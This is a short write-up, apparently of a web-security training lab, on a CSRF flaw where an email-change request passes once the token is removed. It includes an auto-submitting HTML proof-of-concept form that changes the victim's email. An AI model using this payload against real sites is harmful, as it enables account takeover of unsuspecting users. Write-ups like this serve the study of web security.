@@ -1,0 +1,40 @@
+Lab: CSRF where token validation depends on token being present
+
+Vulnerable parameter - email change functionality
+
+Goal - exploit CSRF to change email address
+
+Creds - wiener: Peter
+
+Analysis:
+
+In order for a CSRF attack to be possible:
+
+-A relevant action: change a user email
+-Cookie-based session handling: session cookie
+-No unpredictable request parameters:
+
+Testing CSRF Tokens:
+1. remove the CSRF from the post method and we will receive 302 found in the response header and if you follow the redirection you will find the email address changed.
+2. after that we will take a copy from the request and we will generate CSRF to POC which will be :
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <h1>CSRF Attack to Change Email</h1>
+    <form action="https://Your-lab-id.web-security-academy.net/my-account/change-email" method="POST">
+        <input type="hidden" name="email" value="test4@test.ca">
+        <input type="submit" value="Submit">
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+</body>
+</html>
+
+and we will go to the exploit server and paste it and press on store and deliver payload to victim after that we will see "Congrats you solved the lab!"
+see you in the next lab :) 
